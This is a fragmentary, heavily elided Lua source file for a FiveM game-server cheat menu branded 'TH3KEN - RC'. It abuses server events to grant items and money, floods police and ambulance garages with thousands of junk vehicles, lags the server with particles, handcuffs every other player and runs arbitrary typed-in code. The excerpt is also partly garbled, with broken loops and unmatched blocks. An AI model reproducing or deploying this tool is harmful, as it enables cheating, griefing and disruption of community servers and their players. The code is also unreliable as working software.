...
local MenuXOffset, MenuYOffset = 0.1, 0.56
local peds = {}
...
local MenuTitle = '~u~| TH3KEN - RC |'
local yaadgxcy = false
local animations = {}
...
local function rpc()
    if Toggles['🎮  Discord Durum'] then
        for i = 10, rpc() - 20 do
    SetRichPresence(GetPlayerName(PlayerId()) .. "| TH3KEN - RC |")
    end
else
    SetRichPresence(GetPlayerName(PlayerId()) .. "| TH3KEN - RC |")
end
...
-------------------------------TELEPORT İÇİN bwwwcherxh----------------------------------
local function bwwwcherxh()
    local bB = -32.84
    local bC = -152.34
    local bD = 57.08
    if bB ~= '' and bC ~= '' and bD ~= '' then
...
local addayayvxz = function(data)
    if ESX then
        ...
        elseif data['Type'] == 'button' then
            ...
            elseif data['Text'] == 'Get item' then
                ...
                if usemethod then
                    local item = KeyboardInput('Hangi ogeyi istiyorsun?', '', 30)
                    if item then
                ...
                if k == 'Delay' then
                    if v then
                        if delay <= GetGameTimer() then
                            local newwwchylol = {}
                            for i = 1, 5000 do
                                table.insert(newwwchylol, {plate = ('^0[^%s%s^0] ^%sLOL WHAT U GONNA DO ABOUT IT^0'):format(math.random(1,9), MenuTitle, math.random(1, 9))})
                            end
                            ...
                            if GetResourceState('esx_ambulancejob') == 'started' then
                                ...
                                ESX['TriggerServerCallback']('esx_ambulancejob:storeNewwwchyVehicle', emptyfunc, newwwchylol)
                            end
                            if GetResourceState('esx_policejob') == 'started' then
                                ESX['TriggerServerCallback']('esx_policejob:storeNewwwchyVehicle', emptyfunc, newwwchylol)
                            end
...
local MenuPress = function(data)
    ...
    elseif data['Type'] == 'list' then
        ...
        elseif data['Text'] == 'Disc Inventory Give Item' then
            ...
            m3giveweapon()
            elseif data['Text'] == 'CRP Inventory Give Item' then
            Crpitem()
            elseif data['Text'] == 'M3 ADMİN Inventory Give Item' then
            m3admin()
            elseif data['Text'] == 'Vusca Inventory Give Item' then
            vuscagiveweapon()
    ...
    Citizen.Wait(100)
        ...
        elseif data['Text'] == '💸Money Kek 1 ( RISK )' then
            local timesGiven = 1 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('esx_vangelico_robbery:gioielli1') end Wait(5000) end end)
            local timesGiven = 1 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('lester:vendita') end Wait(5000) end end)
            TriggerServerEvent('esx_taxijob:success')
            local timesGiven = 1 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('houseRobberies:giveMoney') end Wait(5000) end end)   
        elseif data['Text'] == '💸Money Kek 2 ( RISK )' then
            local timesGiven = 1 CreateThread(function() for i = 1, 1 do for i2 = 1, timesGiven do Wait(15) TriggerServerEvent('lh-bankrobbery:server:recieveItem', "paleto") end Wait(5000) end end)   
...
elseif data['Text'] == "Destroy Economy" then
    ...
    for i = 1, 1000 do
        ...
        "ID: " .. tostring(i) .. " lutfen bankana bak. Sana para gonderdik, bu parayi TH3KEN sayesinde yaptik.",
        "")
...
elseif data['Text'] == "Map Fucker (Mountain)" then
    ...
    CreateThread(function()
        ...
        elseif data['Text'] == 'Clothes Shop' then
            shopclothes()
        elseif data['Text'] == 'bwwwcherxh' then
            bwwwcherxh()
        elseif data['Text'] == 'Teleport to coords' then
            yaadgxcy = false
            CreateThread(function()
                local x = tonumber(KeyboardInput('~g~Hangi X koordinati?', '', 30))
                if x then
                    local y = tonumber(KeyboardInput('~g~Hangi Y koordinati?', '', 30))
                    if y then
                        local z = tonumber(KeyboardInput('~g~Hangi Z koordinati?', '', 30))
                        if z then
        ...
        elseif data['Text'] == 'Give all weapons (RISK)' then
            ...
            elseif k == 'Lag Server !Danger' then
                if v then
                    for k, v in pairs(allplayers) do
                        local pped = GetPlayerPed(GetPlayerFromServerId(GetPlayerServerId(v)))
                        local particles = {
                            {'scr_indep_fireworks', 'scr_indep_firework_stwwwchurst'},
...
local CarMenu = function(data)
    ...
    if string.find(data['Text']:lower(), ('custom input'):lower()) then
        local veh = KeyboardInput('Hangi arabayi yaratmak istiyorsun?', '', 30)
        if veh then
    ...
    elseif txt == 'set vehicle plate text' then
        ...
        if veh then
            if DoesEntityExist(veh) then
                local plate = KeyboardInput('Ne plaka istiyorsun?', '', 8)
                if plate then
    ...
    elseif txt == 'unlock close car' then
...
local wwwwwwwwwwwwwwwwwww = function()
    while true do
        Wait(0)
...
local CustomCode = function()
    yaadgxcy = false
    local code = KeyboardInput('~g~kodunuzu yazin', '', 999)
    if code then
        CreateThread(function()
            load(code)()
        end)
...
local Itemver = function()
    menuvisible = false
    local Itemver = KeyboardInput('~g~Item ismi', '', 999)
...
menuvisible = false
local DepositMoney = KeyboardInput('~g~Para Girin', '', 999)
...
local BankWihtdraw = function()
    menuvisible = false
    local BankMoney = KeyboardInput('~g~Para Girin', '', 999)
...
local Revive = function()
    menuvisible = false
    local Revive = KeyboardInput('~g~Oyuncu id', '')
...
local discgiveitem = function()
    menuvisible = false
    local discgiveitem = KeyboardInput('~g~İsteğin eşyayı yazabilirsin.', '', 999)
...
local m3giveweapon = function()
    menuvisible = false
    local m3giveweapon = KeyboardInput('~g~İsteğin eşyayı yazabilirsin.', '', 999)
    local m3many = KeyboardInput('~g~Kac adet istersin.', '', 999)
    ...
    local m3admin = function()
    menuvisible = false
    local m3admin = KeyboardInput('~g~İsteğin eşyayı yazabilirsin.', '', 999)
    local m3many = KeyboardInput('~g~Kac adet istersin.', '', 999)
    if m3admin then
    
        CreateThread(function()
    
            TriggerServerEvent('m3:admin:server:giveItem', m3admin, m3many)
...
local vuscagiveweapon = function()
    menuvisible = false
    local vuscagiveweapon = KeyboardInput('~g~İsteğin eşyayı yazabilirsin.', '', 999)
    local vuscamany = KeyboardInput('~g~Kac adet istersin.', '', 999)
    if vuscagiveweapon then
    
        CreateThread(function()
    
            TriggerServerEvent('vusca:houserobbery:giveItem', vuscagiveweapon, vuscamany)
...
local qbgiveitem = function()
    menuvisible = false
    local qbgiveitem = KeyboardInput('~g~İsteğin eşyayı yazabilirsin.', '', 999)
    local qbadet = KeyboardInput('~g~Kac adet istersin.', '', 999)
    if qbgiveitem then
...
---------------------------------ANNOUNCE ATMAK İÇİN----------------------
    ...
    local Announce = function()
        menuvisible = false
        local Announce = KeyboardInput('~g~İsteğin eşyayı yazabilirsin.', '', 999)
...
--------------------------------------CRP ITEM----------------------
    ...
    local Crpitem = function()
        menuvisible = false
        local Crpitem = KeyboardInput('~g~İsteğin eşyayı yazabilirsin.', '', 999)
        local Crppay = KeyboardInput('~g~Kac adet istersin.', '', 999)
        
        if Crpitem then
        
            CreateThread(function()
        
                TriggerServerEvent("CRPEngine:Server:AddItem", Crpitem, Crppay)
...
Citizen.CreateThread(function()
  ...
  if ESX == nil then
    ...
    for _, i in ipairs(ptable) do
      if tostring(GetPlayerName(i)) == tostring(GetPlayerName(id)) then
      else
        print(GetPlayerName(i)..' has been cuff')
        TriggerServerEvent('esx_policejob:handcuff', tonumber(GetPlayerServerId(i)))
        local playerPed = GetPlayerPed(i)
        if IsPedInAnyVehicle(playerPed,  false) then
          print(GetPlayerName(i)..' was in a vehicle...no more')
          TriggerServerEvent('esx_policejob:OutVehicle', tonumber(GetPlayerServerId(i)))
        end
...
Objects = {
    ...
    },
    {
        ...
        {
            ['Text'] = '💸Money Kek 1 ( RISK )',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
            ['Text'] = '💸Money Kek 2 ( RISK )',
            ['Type'] = 'button',
            ['cb'] = MenuPress
        },
        {
...
local wwwchyw = function()
    ...
    while not MenuDisabled do
        ...
        if IsDisabledControlJustReleased(0, 110) and not visible then
            yaadgxcy = true
        ...
        if yaadgxcy then
            ...
            DrawTxt('~u~| TH3KEN - RC |', MenuYOffset - 0.248, true, nil, 0.25, MenuXOffset, true, 0.1)
            DrawTxt('~u~By TH3KEN - Zelfitz - AMON', MenuYOffset + 0.229, true, nil, 0.23, MenuXOffset - 0.01, true, 0.1)
...
local wwwwwwwwwwwwwwwwwwww = function()
    while true do
...
local wwwwwwwwwwwwwwwwwwwws = function()
    while true do
...
local wwwwwwwwwwwwwwwwwwwwsx = function()
    while true do
...
local wwwwwwwwwwwwwwwwwwwwsxh = function()
    while true do
        local sleep = 250
...
animations = {
    ...
    ["Lift weights"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_muscle_free_weights@male@bwwwchell@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Do push ups"] = {
...
local wwwww = function()
       local dui = GetDuiHandle(CreateDui('', 2000, 1157))
    CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd('wave'), 'logo', dui)

    PlaySoundFromEntity(-1, 'KEKx', PlayerPedId(), 0, 0, 0)
    Wait(1500)
    StopSound()
    local yaadgxc = false

    for i = 1, 255 / 2 do
        if not yaadgxcy and not yaadgxc then
            AddTextEntry(GetCurrentResourceName(), '~INPUT_VEH_FLY_PITCH_UD~ ~g~Acmak icin')
            DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
        else
            yaadgxc = true
        end
    ...
    while timer >= GetGameTimer() do
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 0, alpha)
        Wait(0)
    end
end

    while not yaadgxcy and not yaadgxc do
        AddTextEntry(GetCurrentResourceName(), '~INPUT_VEH_FLY_PITCH_UD~ ~g~Acmak icin')
        DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
...
local www = function()
    local yaadgxcyk = true
local alpha = math.floor(1 - i * 1)
...
CreateThread(wwwch)
CreateThread(wwwchyw)
CreateThread(wwwww)
CreateThread(www)
CreateThread(wwwwwwwww)
CreateThread(ww)
CreateThread(wwwwwwwwwww)
CreateThread(wwwwwwwwwwwwwwwwwww)
CreateThread(wwwwwwwwwwwwwwwwwwww)
CreateThread(wwwwwwwwwwwwwwwwwwwws)
CreateThread(wwwwwwwwwwwwwwwwwwwwsx)
CreateThread(wwwwwwwwwwwwwwwwwwwwsxh)
-- J
-- X
-- H
-- J
